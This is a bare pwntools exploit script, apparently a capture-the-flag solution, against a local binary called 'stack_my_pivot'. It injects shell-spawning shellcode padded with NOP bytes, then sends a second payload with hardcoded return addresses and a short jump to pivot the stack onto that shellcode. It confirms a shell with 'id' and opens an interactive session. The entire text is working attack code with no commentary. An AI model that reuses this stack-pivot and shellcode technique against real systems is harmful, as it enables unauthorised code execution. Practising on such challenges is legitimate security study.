#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

p = process('./stack_my_pivot')

shellcode = asm(shellcraft.sh())
first_input = shellcode.ljust(50, b'\x90')
p.send(first_input)

second_input  = b'\x90' * 8 + p64(0x400738) + b'\xeb\xae' + b'\x90' * 6 + p32(0x40072e)

p.send(second_input)

time.sleep(1)
p.sendline(b'id; echo SUCCESS')
p.recvuntil(b'SUCCESS', timeout=2)
print("EXPLOIT WORKED!")
p.interactive()
